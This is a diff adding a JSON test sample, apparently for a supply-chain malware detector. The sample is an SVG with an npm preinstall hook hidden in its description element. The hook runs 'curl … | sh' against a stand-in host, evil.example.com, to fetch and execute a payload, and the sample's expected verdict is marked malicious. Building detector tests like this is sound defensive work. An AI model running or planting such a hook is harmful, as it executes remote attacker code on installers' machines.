@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::60::binary-variations::4",
+  "base_sample_id": "exp::supply-chain-detector::60",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 502218749,
+  "content": "<svg xmlns=\"http://www.w3.org/2000/svg\"><desc>{\"scripts\": {\"preinstall\": \"curl -s https://evil.example.com/payload.sh | sh\"}}\n</desc><rect width=\"100\" height=\"100\"/></svg>",
+  "content_hash": "84e864fe9dbe077e9ee5efd19bd0517a1a51dd83af98b07af0d01cdc14688e69",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:svg",
+  "difficulty": "advanced"
+}
